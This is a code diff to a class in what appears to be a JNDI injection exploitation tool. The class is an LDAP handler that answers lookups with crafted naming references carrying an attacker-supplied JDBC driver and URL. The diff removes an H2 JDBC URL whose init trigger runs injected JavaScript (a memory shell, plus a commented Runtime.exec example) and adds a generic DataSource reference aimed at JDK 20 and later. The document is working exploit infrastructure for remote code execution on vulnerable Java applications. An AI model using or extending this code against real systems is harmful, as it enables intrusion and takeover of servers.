@@ -13,6 +13,11 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.fusesource.jansi.Ansi;
 
+import javax.naming.RefAddr;
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
+import java.util.Enumeration;
+
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/jdbc2"})
@@ -25,31 +30,28 @@ public class jdbcController2 implements LdapController {
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
-        String jscode = null;
         try {
             Entry  e    = new Entry(base);
+            String driver = payloadType;
+            String JDBC_URL = params[0];
 
-            if (payloadType.contains("E-")) {
-                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
-                jscode = InjShell.injectClass(EchoClass);
+            Reference ref = new Reference("javax.sql.DataSource", factoryType, null);
+            ref.add(new StringRefAddr("driverClassName", driver));
+            ref.add(new StringRefAddr("url", JDBC_URL));
+            ref.add(new StringRefAddr("initialSize", "1"));
+
+            e.addAttribute("objectClass", "javaNamingReference");
+            e.addAttribute("javaClassName", ref.getClassName());
+            e.addAttribute("javaFactory", ref.getFactoryClassName());
+
+            Enumeration<RefAddr> enumeration = ref.getAll();
+            int                  posn        = 0;
+
+            while (enumeration.hasMoreElements()) {
+                StringRefAddr addr = (StringRefAddr) enumeration.nextElement();
+                e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
+                posn ++;
             }
-
-            if (payloadType.contains("M-")) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                InjShell.init(params);
-                jscode = Gadgets.createClassT(ClassName1);
-            }
-
-            jscode = "//javascript\\n" + jscode;
-            //String cmd = "calc";
-            //String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
-            String JDBC_URL1 = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ jscode +"'";
-
-            e.addAttribute("objectClass","javaNamingReference");
-            e.addAttribute("javaClassName", "javax.sql.DataSource");
-            e.addAttribute("javaFactory",factoryType);
-            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL1,"/1/driverClassName/org.h2.Driver","/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");
 
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -61,7 +63,7 @@ public class jdbcController2 implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        System.out.println("- JNDI JDBC Refenrence Links ");
+        System.out.println("- JNDI JDBC Refenrence Links Target >= JDK20");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
@@ -70,7 +72,7 @@ public class jdbcController2 implements LdapController {
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  driver: " + payloadType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
